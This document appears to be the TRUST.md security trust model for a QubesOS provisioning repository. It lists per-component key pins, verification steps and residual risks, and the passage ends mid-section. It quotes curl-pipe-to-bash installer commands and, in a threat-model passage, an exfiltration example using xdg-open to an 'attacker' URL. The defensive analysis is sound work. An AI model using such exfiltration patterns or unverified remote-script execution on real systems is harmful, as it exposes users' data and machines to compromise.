# SEQS Trust Model

Companion to the [README](README.md). This document records, **per component**,
what you are implicitly trusting when you use the scripts in this repository,
how (or whether) that trust is verified, and the residual risk that remains.

QubesOS isolates qubes from one another. These scripts deliberately *cross* those
boundaries — copying code into dom0, installing software into templates, wiring
qubes together — so every crossing is a place where trust is extended. The point
of this file is to make each assumption explicit and reviewable.

The installer uses a thin dom0 runner, states under `salt/seqs/`, and configuration in `salt/pillar/seqs/config.sls`. Per-component fingerprint verification dates are recorded in their entries.

## Re-verifying these claims yourself

This file is the *claim*. Two companion documents help you check it before trusting the resulting qubes:

- **[VERIFY-HUMAN.md](VERIFY-HUMAN.md)** — a hands-on walkthrough for the operator: what to read top-to-bottom in what order, cross-check tables for every pinned signing-key fingerprint (with the exact `curl | gpg --show-keys` one-liners), install-time watch points, and the honest residual-risk summary.
- **[VERIFY-LLM.md](VERIFY-LLM.md)** — a machine-runnable verification protocol (bash + `curl` + `gpg` + `awk`): static syntax, embedded-key-fingerprint vs in-script pin parity, Brave's three-key set, **live upstream fingerprints** still matching the pins (catches upstream key rotation), `TRUST.md` ↔ code path coherence, pillar qube-spec validation, `brave_extensions` well-formedness, verifier abort-order audit (every abort happens strictly *before* the corresponding irreversible write), README ↔ components coherence, policy-ownership parity between the runner and the dom0 state, and the offline/air-gap logic. Each section ends with an explicit PASS/FAIL criterion and they aggregate into a single report.

The 📝 *Reviewed* trust level used throughout this document is **not** "the author eyeballed it" — it is "you, the operator, should run VERIFY-HUMAN.md (and ideally VERIFY-LLM.md) before extending dom0 trust to anything here."

## Trust levels

| Level | Meaning |
|-------|---------|
| ✅ Verified | Integrity checked against a cryptographic pin or an independent reference. |
| 📝 Reviewed | No automated check; trust rests on you having read the committed file. See VERIFY-HUMAN.md / VERIFY-LLM.md for how. |
| ⚠️ TOFU | Fetched over HTTPS; trust on first use — you trust TLS/CA + whoever answered, with no pin. Package-manager signatures apply *afterwards*. |
| ❌ Unverified | HTTPS transport only; no signature or checksum. Compromise of the host, CDN, mirror, or DNS means code execution. |

---

## 1. Trusted Computing Base

Trusted unconditionally — nothing in this repo can compensate if these are compromised.

### QubesOS + dom0
- **Trust assumption:** The hypervisor, dom0, and the qrexec/policy system enforce isolation correctly.
- **Established by:** The QubesOS project. Out of scope for this repo.
- **Residual risk:** A dom0 compromise is total. Note that `setup-qubes.sh` runs *in* dom0 — see §2.

### The QubesOS installation ISO
- **Trust assumption:** The ISO you installed from is genuine.
- **Established by:** ✅ [`docs/install-qubes.md`](docs/install-qubes.md#2-verify-the-iso-before-flashing-it) walks the operator through the full verification protocol: fetch the Qubes Master Signing Key, cross-check the QMSK fingerprint `427F 11FD 0FAA 4B08 0123 F01C DDFA 1A3E 3687 9494` against three independent sources (Qubes website, the `qubes-secpack` GitHub repo, `keys.openpgp.org`), trust the QMSK, fetch the release signing key, then `gpg --verify` the ISO. Same three-source pattern as the apt keys.
- **Residual risk:** A tampered ISO compromises everything from first boot, so the protocol is only as good as the operator's discipline in actually running it. The repo cannot enforce that step — skipping it makes every claim in this document downstream of it false.

### Qubes update proxy (`127.0.0.1:8082`)
- **Trust assumption:** The updates proxy and the sys-net/sys-firewall chain relay template downloads honestly.
- **Established by:** Qubes default configuration.
- **Residual risk:** It sees and routes all template `curl`/`apt` traffic. TLS still protects content end-to-end; a hostile proxy can block or attempt downgrades but not forge signed packages.

---

## 2. Bootstrap & installation

### The SEQS repository contents
- **Trust assumption:** Every script here does what it claims and nothing else.
- **Established by:** 📝 You. The README explicitly tells you to read every file first; **VERIFY-HUMAN.md** is the structured walkthrough for that read (what to look at, in what order, what to spot-check), and **VERIFY-LLM.md** is the machine-runnable cross-check (key fingerprints, abort-order audit, README↔components coherence, …). The repo is not signed.
- **Residual risk:** Whoever can write to the repo (or the branch you pull) controls dom0 and every template. **Treat repo write-access as dom0-equivalent.** The VERIFY-* docs guard against in-flight tamper between code and what TRUST.md claims, but they do not establish that the repo URL you cloned from is the one you meant.

### `REPO_VM` — the qube hosting the repo
- **Trust assumption:** The qube the repo is fetched from is not compromised.
- **Established by:** 📝 Your choice of qube; it is contacted exactly once by the fetch stage. Stage-only and build-only runs never contact it.
- **Residual risk:** The fetched tree becomes root-executed Salt code in dom0, so a compromised `REPO_VM` = compromised dom0 **unless the operator's independent review catches the malicious bytes** (diff + `CONTINUE` prompt, or `--fetch-only` audit). A disposable limits persistence and cross-contamination but does not authenticate the download or make its contents trustworthy.
- **Guidance for the operator:** The README's first-install path uses a fresh networked DisposableVM, passes its name with `--repo-vm`, keeps it alive only through `--fetch-only`, and then destroys it. Do **not** use a daily `personal` qube. For ongoing maintenance, either repeat the disposable workflow or use a dedicated, minimal, network-light repo qube.

### The dom0 "cat hack" bootstrap copy
- **Trust assumption:** `qvm-run -p REPO_VM cat setup-qubes.sh` returns the genuine runner.
- **Established by:** ❌ Nothing — a raw byte copy with no integrity check, used **only** to bootstrap `setup-qubes.sh` itself. This is the documented Qubes way to move a file into dom0, and is exactly why review must happen *before* running anything.
- **Residual risk:** No tamper detection between `REPO_VM` and dom0 for this one file; mitigated only by manual review and by `REPO_VM` being trusted. The documented bootstrap command appends `2>/dev/null` to `qvm-run` so a compromised `REPO_VM` cannot emit ANSI / CSI / OSC sequences to dom0's terminal during the fetch — the runner's `sanitize()` filter doesn't yet exist at this stage, so stderr would otherwise reach the terminal raw.

### The salt-tree fetch (single validated tar transfer + review gate)
- **Trust assumption:** The tree staged under `/srv` is the fetched tree you reviewed.
- **Established by:** 📝 Fetch validates one tar stream and saves it under `/var/lib/seqs/fetched`; stage requires its completion marker, displays the `/srv` diff, and copies it root-owned. Build requires the stage completion markers.
- **Residual risk:** These boundaries help only if the operator reviews the fetched data before staging and building it.

### `setup-qubes.sh` (thin dom0 runner)
- **Trust assumption:** Orchestrates fetch → stage → build correctly and fails loudly when a state fails.
- **Established by:** 📝 Reviewed. All qube creation and provisioning logic lives in the Salt states; the runner only sequences them (dom0 state, then templates, then app qubes, with `qvm-shutdown --wait` barriers so template root volumes are committed before app qubes snapshot them).
- **Residual risk:** Runs with the dom0 user's privileges plus `sudo` for `/srv` staging and `qubesctl`. Failure detection is belt-and-braces: `qubesctl`'s exit code **and** a scan of its (sanitized) output for salt's own failure markers (`Result: False`, non-zero `Failed:` summary), because qubesctl versions differ in whether failed states propagate non-zero. For `offline` qubes the runner independently re-checks `qvm-prefs <vm> netvm` after the dom0 apply and refuses to provision anything if the air gap is not in effect.

> **Interrupted or failed runs.** The flow is **convergent**: completed components are skipped via `/rw/config/seqs/` markers, existing qubes are reconfigured, and an interrupted creation is resumed through its intent marker in `/var/lib/seqs/intents/`. A same-named qube without that marker or the `seqs-managed` feature is refused. Per-component `timeout:` on the Salt `cmd.run` states (`component_timeout`, default 900 seconds) bounds a hung installer; after a timeout inside a template, treat its state as suspect and re-run.

### `install-scripts/*.sh` (run inside templates / app qubes)
- **Trust assumption:** Each install script is safe to run as root in its VM.
- **Established by:** 📝 Reviewed. They are delivered as salt fileserver payload (`salt://seqs/files/...`), staged onto tmpfs (`/run/seqs/stage`, evaporates at shutdown) and run as user `user` with internal **passwordless `sudo`** (full-template default) — i.e. root in that VM.
- **Residual risk:** A malicious or compromised install script owns that template and every app qube based on it.

### `lib/*.sh` staging mechanism
- **Trust assumption:** The shared libraries staged next to each install script are the genuine ones.
- **Established by:** 📝 Reviewed; shipped in the same validated tar transfer and delivered via the Salt fileserver. The libraries are overlaid **after** component files, so a component asset cannot shadow `verify-gpg.sh` or `brave.sh`.
- **Residual risk:** Same as any install script — runs as root in the template.

### The Qubes Salt management stack (`qubesctl`, disposable management VM)
- **Trust assumption:** Qubes' shipped `qubes-mgmt-salt` machinery (dom0 salt-ssh over qrexec, the disposable management VM, the `qvm.*` state modules) faithfully delivers states and files *into* qubes without letting qube output influence dom0.
- **Established by:** The QubesOS project — this is the distribution's own management mechanism, also used by `qubesctl state.highstate`.
- **Residual risk:** Part of the TCB (§1) in effect. Target templates must carry `qubes-mgmt-salt-vm-connector` (stock Debian templates do; minimal templates need it installed first, or the per-qube applies hang).

---

## 3. Software sources

### apt-repo trust anchors: `chattr +i` on every embedded-key keyring
Each apt-repo component below (Brave, Signal, Element, Docker, VS Code) drops its verified signing key at a known path under `/usr/share/keyrings/` or `/etc/apt/keyrings/` and references that path from `signed-by=` in `/etc/apt/sources.list.d/…`. After the install completes, the script runs `sudo chattr +i` on the keyring file. The Pin-Priority: -1 + named-package allowlist (Brave excludes `brave-keyring` for this reason; the others bound the package set to the app itself) gates which packages this repo can ship. `chattr +i` is the additional layer: a root-running maintainer script inside an allowlisted package that did `cp /usr/share/<app>/something.gpg ${keyring}` would silently rotate the trust anchor the `signed-by=` directive references — with no SEQS verification ever firing again. Immutability turns that into a loud dpkg failure, forcing legitimate key rotation through manual `sudo chattr -i ${keyring}` + re-verify of the new fingerprint against the same three independent sources documented per-component below.

### Brave — apt repository & signing keys ✅
- **Trust assumption:** Brave's apt signing keys are genuine; thereafter apt trusts whatever Brave signs.
- **Established by:** ✅ `lib/brave.sh` downloads the keyring and **aborts unless it contains exactly the three pinned key fingerprints**:
  - `DBF1A116C220B8C7164F98230686B78420038257`
  - `47D32A74E9A9E013A4B4926C68D513D36A73CD96`
  - `B2A3DCA350E67256740DF904DE4EC67BE4B0DCA0`

  The fingerprints were verified on **2026-05-18** by cross-checking three independent sources — forging the set would require compromising all three at once:

  1. The keyring served from the actual install source (the S3 apt bucket):
     <https://brave-browser-apt-release.s3.brave.com/brave-browser-archive-keyring.gpg>
  2. The same keys published as ASCII-armored PGP blocks on Brave's signing-keys page (a different host), under the heading "Linux Package Repositories — Release Channel":
     <https://brave.com/signing-keys/>
  3. Key `DBF1A116C220B8C7164F98230686B78420038257` independently hard-coded in an unrelated third-party project:
     <https://github.com/fphammerle/docker-brave-browser/blob/master/Dockerfile>

  See the `lib/brave.sh` header comment for the exact commands used.
- **Residual risk:** The pin only proves you got Brave's real keys; it does not vouch for what Brave builds and signs. The fingerprints were captured on **2026-05-18** — if Brave rotates keys the install fails by design and the pins must be re-verified against the links above.

### KeePassXC — AppImage with verified signature ✅
- **Trust assumption:** The KeePassXC AppImage really was built and released by the KeePassXC team.
- **Established by:** ✅ `install-scripts/components/keepass/template-vm.sh` embeds the KeePassXC release signing key, downloads the release's detached `.sig`, and **aborts unless `gpg --verify` confirms the AppImage is signed by that key** (primary fingerprint `BF5A669F2272CF4324C1FDA8CFB4C2166397D0D2`). The fingerprint was verified on **2026-05-18** against `keepassxc.org/verifying-signatures/`, a keys.openpgp.org by-fingerprint lookup, and the Arch Linux `keepassxc` PKGBUILD — see the script header. After verification, the script hashes the AppImage, makes it read-only, re-hashes immediately before installing it root-owned, and aborts on drift. The keepass qube is `offline`, which implies `no_handoff`: dom0 denies `qubes.OpenURL` from `A-keepass`, and the qube does not set the browser handoff as its default.
- **Residual risk:** The version (currently 2.7.12) is pinned in the script; an AppImage does not auto-update, so security fixes arrive only when the pin is bumped and the script re-run. The signing key is embedded in the repo, so it also inherits §2 repo trust.

### Signal — apt repository with an embedded, verified key ✅
- **Trust assumption:** Signal's apt signing key is genuine; thereafter apt verifies package signatures and updates flow via normal template `apt upgrade`.
- **Established by:** ✅ `install-scripts/components/signal/template-vm.sh` embeds the Signal signing key and **aborts unless its fingerprint matches the pinned value** `DBA36B5181D0C816F630E889D980A17457F6FB06`. Signal publishes no fingerprint, so it was cross-checked on **2026-05-18** against the key served at `updates.signal.org`, a keys.openpgp.org by-fingerprint lookup, and Wayback Machine snapshots from 2018/2020/2022 (the same key for 8+ years) — see the script header. The script also installs `/etc/apt/preferences.d/signal-xenial.pref`, which default-denies the entire `updates.signal.org` origin (`Pin-Priority: -1`) and re-allows only `signal-desktop` / `signal-desktop-beta` at normal priority — defense-in-depth that bounds the repo's reach to a single named package set.
- **Residual risk:** The key pin proves you have Signal's real key; it does not vouch for what Signal builds and signs. The package pin further bounds a compromised-signing-infrastructure attacker to shipping a hostile `signal-desktop` — they cannot use this repo to publish a higher-version `bash`, `libc6`, `systemd`, etc. that apt would otherwise prefer over Debian's. The embedded key inherits §2 repo trust.

### Docker — apt repository with an embedded, verified key ✅
- **Trust assumption:** Docker's apt signing key is genuine; thereafter apt verifies package signatures and updates flow via normal template `apt upgrade`.
- **Established by:** ✅ `install-scripts/components/docker/template-vm.sh` embeds the Docker signing key and **aborts unless its fingerprint matches the pinned value** `9DC858229FC7DD38854AE2D88D81803C0EBFCD88`. Verified on **2026-05-19** against `download.docker.com`, `keyserver.ubuntu.com` and `keys.openpgp.org` (and Wayback Machine snapshots from 2020/2023) — see the script header.
- **Residual risk:** docker-group membership granted to `user` is **equivalent to root inside the qube** — significant because dev qubes run untrusted build code. Images pulled at runtime are arbitrary code.

### Element — apt repository with an embedded, verified key ✅
- **Trust assumption:** The Element apt signing key is genuine; thereafter apt verifies package signatures and updates flow via normal template `apt upgrade`.
- **Established by:** ✅ `install-scripts/components/element/template-vm.sh` embeds the Element signing key and **aborts unless its fingerprint matches the pinned value** `12D4CD600C2240A9F4A82071D7B0B66941D01538`. Verified on **2026-05-20** against the key served at `packages.element.io/debian/element-io-archive-keyring.gpg`, a `keyserver.ubuntu.com` by-fingerprint lookup, and a `keys.openpgp.org` by-fingerprint lookup; a Wayback Machine snapshot from 2023 carries the same fingerprint. uid is the historical "riot.im packages <packages@riot.im>" (Element's prior name). Element Desktop is not in the Debian repositories (verified 2026-05-20), so the upstream apt repo is the only mainstream channel; the install procedure matches the Brave/Signal/KeePass pattern. The script also installs `/etc/apt/preferences.d/element-io.pref`, which default-denies the entire `packages.element.io` origin (`Pin-Priority: -1`) and re-allows only `element-desktop` / `element-desktop-nightly` at normal priority — defense-in-depth that bounds the repo's reach to a single named package set.
- **Residual risk:** The key pin proves you have Element's real key; it does not vouch for what Element builds and signs. The package pin further bounds a compromised-signing-infrastructure attacker to shipping a hostile `element-desktop` — they cannot use this repo to publish a higher-version `bash` or other system package that apt would otherwise prefer over Debian's. The embedded key inherits §2 repo trust.

### VS Code — apt repository with an embedded, verified key ✅
- **Trust assumption:** The Microsoft signing key is genuine.
- **Established by:** ✅ `install-scripts/components/vscode/template-vm.sh` embeds the Microsoft signing key and **aborts unless its fingerprint matches the pinned value** `BC528686B50D79E339D3721CEB3E94ADBE1229CF`. Verified on **2026-05-19** against `packages.microsoft.com/keys/microsoft.asc`, `keyserver.ubuntu.com` and `keys.openpgp.org` — see the script header.
- **Residual risk:** VS Code extensions (the Marketplace) run with full user privileges — the real VS Code attack surface, beyond the package install.

### Telegram — snap
- **Trust assumption:** Canonical's snap store and the `telegram-desktop` publisher.
- **Established by:** ⚠️ snapd verifies Canonical-signed assertions; the snap content is the publisher's.
- **Residual risk:** Publisher or store compromise; the snap auto-updates.

### BitBoxApp — .deb with a verified signature ✅
- **Component:** `install-scripts/components/bitbox/template-vm.sh` — downloads the BitBoxApp `.deb` and its detached `.asc`.
- **Established by:** ✅ The script embeds the ShiftCrypto Security signing key and **aborts unless `gpg --verify` confirms the `.deb` is signed by it** (fingerprint `DD09E41309750EBFAE0DEF63509249B068D215AE`). Verified on **2026-05-19** against BitBox's own docs (which publish the fingerprint), `keyserver.ubuntu.com` and `keys.openpgp.org` — see the script header. Installed via `apt-get` so dependencies resolve. After the gpg check, the script also binds the verified bytes against in-place tamper between verify and install: hash the `.deb`, `chmod 0400`, re-hash immediately before `apt-get install` and abort on drift — `apt-get install` of a local `.deb` does not re-verify the gpg signature, so without this TOCTOU pin the verified file could be swapped in the window. (Not in the default wallet qube specs; add `bitbox` to a wallet qube's component list in `salt/pillar/seqs/config.sls` to include it.)
- **Residual risk:** The pinned version (currently 4.51.0) is bumped manually. A crypto wallet — keep its qube isolated.

### Apache OpenOffice — tarball with a verified signature ✅
- **Component:** `install-scripts/components/openoffice/template-vm.sh` — downloads the Apache OpenOffice tarball and its detached `.asc` from `downloads.apache.org`.
- **Established by:** ✅ The script embeds Jim Jagielski's Apache OpenOffice release signing key and **aborts unless `gpg --verify` confirms the tarball is signed by it** (fingerprint `A93D62ECC3C8EA12DB220EC934EA76E6791485A8`). Verified on **2026-05-19** against the Apache OpenOffice `KEYS` file, the Apache committer keyring (`people.apache.org`) and `keyserver.ubuntu.com` — see the script header. After the gpg check, the script applies the same TOCTOU pin twice: hash + `chmod 0400` + re-hash on the tarball before `tar -xzf`, and again on every extracted `.deb` (under `en-US/DEBS/` and `…/desktop-integration/`) before `apt-get install`. Without this, the verified tarball or its extracted `.deb`s could be swapped in the window — extraction happens into a user-owned mktemp dir and `apt-get install` of local `.deb`s does not re-verify a gpg signature.
- **Residual risk:** The pinned version (currently 4.1.16) is bumped manually; Apache OpenOffice releases infrequently.

### Ledger Live ❌ — unverifiable
- **Component:** `install-scripts/components/ledger/template-vm.sh` — `curl --proxy 127.0.0.1:8082 -fsSL https://download.live.ledger.com/latest/linux` followed by `sudo install -m 0755 -o root -g root TMP /usr/bin/LedgerLive.AppImage`. The download moved from the app-vm phase to the template phase so the final artifact lands root-owned at `/usr/bin/` rather than user-owned at `~/`.
- **Trust assumption:** The AppImage served by Ledger at that URL is genuine.
- **Established by:** ❌ Nothing. Ledger does **not** publish a GPG signature for the Linux AppImage (only a SHA-512 on a JS-rendered download page), and the download URL is unversioned ("latest"), so the AppImage can be neither signature-verified nor version-pinned. `-f` is set so an HTTP error page is not saved as the AppImage, but the AppImage content itself is trusted on download.
- **Residual risk:** Whoever controls Ledger's download infrastructure or DNS can serve arbitrary code into the wallet qube at install time. The AppImage is root-owned at `/usr/bin/LedgerLive.AppImage`, so a later compromise of the qube user account cannot silently swap it between sessions. The Ledger udev rules are independent of this download.

### pyenv (python component) ❌ — accepted tradeoff
- **Component:** `install-scripts/components/python/app-vm.sh` — `curl -fsSL https://pyenv.run | bash`.
- **Trust assumption:** Whatever `pyenv.run` serves at run time is benign.
- **Established by:** ❌ Unverified remote code piped to a shell. **This is a deliberate choice:** pyenv is kept, in preference to the apt `python3` package, for the flexibility of installing and switching Python versions — accepting the weaker trust. (`app-vm.sh` uses `set -Eeo pipefail` — `-u` is selectively omitted because pyenv's profile sourcing is not nounset-clean; `-e` and `pipefail` are on, so an `pyenv install` / `pip` failure does abort the build.)
- **Residual risk:** Full control of the dev qube for whoever controls `pyenv.run` or its redirect target. `pip install` then pulls from PyPI (hash-checked, not signature-verified).

### Claude Code — native installer (claude-code component) ❌
- **Component:** `install-scripts/components/claude-code/app-vm.sh` — `curl -fsSL https://claude.ai/install.sh | bash`.
- **Trust assumption:** The installer script served by `claude.ai`, and the binary it fetches, are genuine.
- **Established by:** ❌ Unverified — remote code piped to a shell over HTTPS, no signature or checksum; Anthropic publishes no pinnable artifact for this path. `-f` only ensures an HTTP error page is not executed.
- **Residual risk:** Whoever controls `claude.ai/install.sh` or DNS runs code in the dev qube. Claude Code then self-updates, so the trust is ongoing — not just at install time.

### nvm + Node.js (node component) ❌ — accepted tradeoff
- **Component:** `install-scripts/components/node/app-vm.sh` — `curl -fsSL …/nvm/<pinned-tag>/install.sh | bash`.
- **Trust assumption:** The pinned nvm `install.sh` served by GitHub is benign.
- **Established by:** ❌ Unverified remote code piped to a shell, pinned to a specific nvm release. **This is a deliberate choice:** nvm is kept, in preference to the apt `nodejs` package, for the flexibility of installing and switching Node versions — accepting the weaker trust.
- **Residual risk:** Whoever controls that script (or the pinned tag) runs code in the dev qube. `npm install` then runs package lifecycle scripts — a large supply-chain surface.

### Brave wallet extensions ⚠️
- **Mechanism:** Each wallet qube's spec in `salt/pillar/seqs/config.sls` lists extensions as `brave-extension-<name>` components; the `seqs.qube` state looks `<name>` up in the `brave_extensions` map (name → Chrome Web Store ID) in the same pillar file (each qube's pillar slice ships only the IDs it references), ensures Brave is installed (idempotent `ensure_brave` in `lib/brave.sh`), and force-installs the extension via an `external_update_url` manifest. No per-extension component directory exists.
- **Trust assumption:** Google's Web Store distribution and each extension's publisher.
- **Established by:** ⚠️ Web Store hosting + publisher; extensions auto-update silently.
- **Residual risk:** A large surface — every installed wallet extension can read pages and prompt to sign in the browser. Abandoned extensions (Liquality, BlockWallet, Frame) have been removed; the `brave_extensions` map should be periodically pruned to maintained projects only. The default config builds two minimal wallet qubes (Ledger + Rabby, Trezor + Rabby) — much smaller blast radius than a single qube with every extension. Note also that the force-install mechanism (`external_update_url` → Chrome Web Store, written into `/opt/brave.com/brave/extensions/<id>.json`) carries **no version pin and no `.crx` hash pin** — every Brave start fetches whatever the Web Store currently serves — and force-installed extensions cannot be disabled or removed from inside Brave's UI, so a known-bad extension requires dom0 file deletion + template rebuild. This is the one channel in SEQS where the install material is not pinned the way the rest of the repo pins GPG keys against multiple independent sources. Deferred — accepted in exchange for the ergonomic `brave_extensions` flow. **See also "Wallet qube egress is unrestricted ⚠️" in §4 — the qube hosting these extensions has no outbound firewall, so a compromised extension faces no second wall on the way out.**

---

## 4. Runtime & inter-qube wiring

### Browser-link policy (`qubes.OpenURL` → `A-brave`)
- **Component:** the `seqs.dom0` state (`salt/seqs/dom0.sls`) writes `/etc/qubes/policy.d/29-browser.policy` (the catch-all `@anyvm → A-brave allow`) AND `/etc/qubes/policy.d/28-browser-suppress.policy` (deny rules for every qube spec carrying `offline` or `no_handoff`). The 28- file is evaluated before the 29- file (qrexec first-match-wins), so the deny fires before the catch-all allow for opted-out qubes. Both are root-owned `file.managed` states carrying a `Managed by SEQS` header; a pre-existing policy file *without* that header is never silently overwritten — the runner's `confirmPolicyTakeover` blocks on a literal `OVERWRITE` confirmation before any state runs. The link-handoff handler (`/usr/share/applications/open-links-in-browser-qube.desktop`) is installed once per template by the `seqs.qube` state (so it exists, but inert, in every qube), while the per-qube xdg default that actually activates it (`xdg-settings set default-web-browser`) is skipped for `offline`/`no_handoff` qubes — so for those qubes the handler is never the default *and* the dom0 deny blocks the handoff regardless.
- **Trust assumption:** `A-brave` can safely handle arbitrary, possibly hostile URLs handed to it by any qube that *is* allowed to drive the handoff.
- **Established by:** A deliberate design choice — concentrating link handling in one browser qube *is* the isolation benefit.
- **Residual risk:** For qubes WITHOUT `offline` / `no_handoff`, `A-brave` is a funnel for hostile links from every qube; its compromise is in scope. The policy verb is `allow`, **not `ask`** — any code running in those qubes can silently drive `A-brave` to navigate to a chosen URL with no dom0 prompt. A compromised qube can use this to exfiltrate via DNS-in-URL, push the user at a phishing page in `A-brave`, or chain a browser 0-day. `ask` would catch the unexpected programmatic case while leaving normal user-clicked links smooth. Deferred — accepting the silent passthrough for ergonomic handoff. For qubes WITH `offline` / `no_handoff` (default: `keepass`, `wallet-ledger`, `wallet-trezor`), this channel is closed at both the dom0 qrexec boundary and the per-qube xdg config — a compromise of the qube user account cannot re-enable it from inside the qube (the dom0 file is root-owned and the 28- precedes 29- regardless of qube-side xdg state). `offline` implies `no_handoff` because an offline qube with the handoff wired could still drive `A-brave` via `qvm-open-in-vm` (qrexec is unaffected by `netvm=none`) to exfiltrate via `xdg-open https://attacker/?DATA`, silently defeating the air-gap the operator chose `offline` for.

### USB-keyboard policy override (`qubes.InputKeyboard` from `sys-usb` → dom0) ⚠️
- **Component:** the `seqs.dom0` state writes `/etc/qubes/policy.d/30-user-input.policy` (Qubes 4.3 only, only when `sys-usb` exists; on other releases the state neither writes nor deletes the file, and the runner's takeover prompt is likewise scoped) containing:
  `qubes.InputKeyboard  *  sys-usb  @adminvm  ask default_target=@adminvm`
- **Trust assumption:** When a USB device claiming to be a keyboard is attached, the operator will reliably distinguish their own keyboard from a hostile one (BadUSB / O.MG cable / mass-storage stick with HID firmware) and decline the attach prompt for the hostile case.
- **Established by:** A deliberate ergonomic tradeoff. The shipped Qubes 4.3 `50-config-input.policy` *denies* `qubes.InputKeyboard` from `sys-usb` to dom0 outright, so external USB keyboards do not work at all out of the box. The 30- override lowers that to `ask`, matching the mouse/tablet behaviour, so an external keyboard is usable after one confirmation. `default_target=@adminvm` (dom0 pre-selected in the dialog) means a single Enter accepts the attach.
- **Residual risk:** This is a clear weakening of dom0's input isolation versus the Qubes default. Any USB device that enumerates as a HID keyboard — including a BadUSB / Rubber-Ducky implant or a vendor device with hostile firmware — triggers the same prompt as a legitimate keyboard, and the prompt is biased toward acceptance (default = dom0, single keystroke confirms). A successful accept yields keystroke injection into dom0 = total compromise. Mitigations the operator must apply themselves: never attach unknown USB devices, prefer a PS/2 keyboard or a keyboard permanently on the dom0-attached internal controller, and read the qube selector in the prompt rather than reflexively pressing Enter. Deferred — accepting the BadUSB uplift in exchange for being able to use external USB keyboards on Qubes 4.3 without per-boot manual `qvm-input-keyboard` ceremony.

### Boot / shutdown cleanup service ✅
- **Component:** the `seqs.qube` state writes `/usr/sbin/seqs-cleanup` (root, 0755) and `/etc/systemd/system/seqs-cleanup.service` into every template; the systemd unit runs `seqs-cleanup` at app-qube boot **and** shutdown. The script is a no-op inside TemplateVMs (`qubesdb-read /qubes-vm-type` guard, fail-closed: only `AppVM|DispVM` delete). It is installed to `/usr/sbin` (root volume, inherited by app qubes) rather than `/usr/local/bin`, because `/usr/local` in a TemplateBased AppVM/DispVM is a per-qube bind mount to `/rw/usrlocal` and does **not** inherit the template's copy — a script placed there would be invisible to every app qube and the unit would fail `203/EXEC`. Each `cleanup_dirs` entry (pillar `config.sls`) has a `mode`: `folder` paths are removed entirely (`rm -rf`), while `contents` paths have their contents wiped (`find -mindepth 1 -delete`) but the directory itself is kept. Defaults: `folder /home/user/QubesIncoming`, `contents /home/user/Downloads`.
- **Trust assumption:** Every `cleanup_dirs` entry is genuinely a transient location the operator wants wiped on every boot and shutdown.
- **Established by:** ✅ Validated twice — in the `seqs.dom0` pre-flight (nothing is built on failure) and again at render time inside each qube by `seqs.qube`: mode must be `folder` or `contents`, the path must be absolute, strictly under `/home/user/` with at least one extra non-empty segment, contain no `..` component, and use only `[A-Za-z0-9._/-]` characters. Entries such as `/home/user`, `/etc`, `/`, or `/home/user/../etc` are rejected before any template is built, bounding deletion to the qube user's home tree. Spaces and shell metacharacters are rejected so interpolation cannot escape the cleanup loop.
- **Residual risk:** Within the validated bound, `seqs-cleanup` runs as root and *will* delete anything the operator put into a `cleanup_dirs` location between boot and shutdown — Downloads contents vanish on every reboot (the `Downloads` directory itself is kept; QubesIncoming is removed entirely), including transaction CSV exports, wallet-recovery sheets and downloaded firmware. This is by design (transient = transient), but the operator must internalise that those directories are not for storage. Note also that the shutdown leg (`ExecStop`) is best-effort: it does **not** run on `qvm-kill`, host power-loss, or a dom0 crash — the boot leg (`ExecStart`) is the reliable backstop that guarantees a clean state before the qube is used. The wipe is an `unlink`, not a secure erase; on thin-LVM/SSD-backed private volumes the underlying blocks are not guaranteed to be overwritten.

### dom0 terminal output sanitization ✅
- **Component:** `setup-qubes.sh` defines `sanitize()`, a three-stage filter (`tr -d '\000-\010\013-\037\177'` for C0 controls except TAB/LF plus DEL; `iconv -f UTF-8 -t UTF-8 -c` for raw 8-bit C1 bytes; a `sed` strip of UTF-8-encoded C1 codepoints U+0080–U+009F). Everything that reaches the dom0 terminal flows through it: all `qubesctl` output (`runQubesctl`), error messages that can embed attacker-influenced strings (tar entry names), the policy-takeover banner, and the fetch-gate diff.
- **Trust assumption:** The dom0 terminal emulator should never have to interpret a control byte that originated inside a VM.
- **Established by:** ✅ Per-qube provisioning runs through the disposable management VM; VM output is not executed or parsed in dom0. The sanitizer protects display paths because `qubesctl --show-output` can include installer output from target qubes. ESC, BEL, CR, FF, SO/SI, CSI/OSC, and both C1 encodings cannot reach the terminal; UTF-8 remains readable.
- **Residual risk:** The failure-marker scan in `runQubesctl` greps this sanitized output for `Result: False` / non-zero `Failed:` counts — a VM that could forge or suppress those markers could at most cause a spurious failure report (annoying, fail-safe direction), since the exit code is checked independently. The remaining unsanitized surface is what the `qvm-*` management commands print directly — deterministic Qubes management strings, not VM-controlled output.

### ADB file transfer ✅
- **Component:** `install-scripts/components/adb/template-vm.sh` -- `apt-get install -y adb pv` (Debian-signed). The chunked, resumable `adb-pull` helper (`install-scripts/components/adb/adb-pull.sh`) is staged next to the install script as a per-component asset by the `seqs.qube` state and installed system-wide to `/usr/bin/adb-pull` in the template.
- **Qube:** `A-usb-data-transfer` (red label). `sys-usb` is **not** modified; phones are USB-attached to this qube via Qubes' standard device-attach mechanism, isolating the larger ADB code surface from the front-line USB qube.
- **Trust assumption:** The Android device / ADB peer attached to the qube is the real one.
- **Established by:** ✅ `adb` and `pv` arrive through normal Debian apt signature verification.
- **Residual risk:** Wireless ADB (the fallback when USB attach isn't an option) exposes a shell-capable channel on the LAN; the `adb-pull` end-of-transfer SHA-256 check catches transport corruption but **not** a malicious peer (both hashes flow through the same ADB channel). Prefer USB-attached ADB; reserve wireless ADB for trusted networks.

### Hardware-wallet udev rules ⚠️
- **Components:** `install-scripts/components/ledger/template-vm.sh` and `install-scripts/components/trezor/template-vm.sh` install the Ledger and Trezor udev rules respectively.
- **Trust assumption:** Any USB device that enumerates with a Ledger or Trezor VID/PID is the actual hardware wallet the operator intended to attach.
- **Established by:** 📝 Reviewed; mirrors vendor-published rules. The rules also tighten the upstream `MODE="0666"` to `0660` + `uaccess`/`udev-acl`, so the device is only reachable via the seated user's dynamic ACL rather than by every process on the system — a real improvement over the vendor default.
- **Residual risk:** udev grants `uaccess` based on USB VID/PID alone, and USB descriptors are entirely self-asserted. Any programmable USB device — BadUSB, an O.MG cable, a flashed Pi Pico, a hostile dev board — can claim `0x2c97` (Ledger) or `0x534c` / `0x1209` (Trezor) and receive the same ACL as the genuine wallet. Concrete consequences:
